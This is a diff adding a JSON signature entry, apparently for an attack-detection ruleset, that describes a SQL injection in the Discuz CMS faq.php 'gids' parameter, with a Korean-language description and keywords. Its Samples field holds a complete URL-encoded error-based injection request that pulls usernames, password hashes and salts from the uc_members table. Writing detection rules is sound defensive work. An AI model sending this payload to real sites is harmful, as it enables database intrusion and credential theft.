@@ -1,0 +1,9 @@
+{
+        "Name": "Comsenz Discuz faq.php SQL Injection",
+        "Description": "-   MySQL, PostgreSQL을 지원하는 중국에서 많이 사용되는 PHP 기반 오픈 소스 CMS  \n -   faq.php에서 gids 매개변수를 통해 전달되는 값을 적절하게 검증하지 않았기 때문에 발생 \n -   악용에 성공하면 DB 정보 획득이 가능",
+        "References": [],
+        "Samples": ["GET /faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"],
+        "Keywords": [["faq.php","gids"],["URL"]],
+        "Signature": []
+}
+
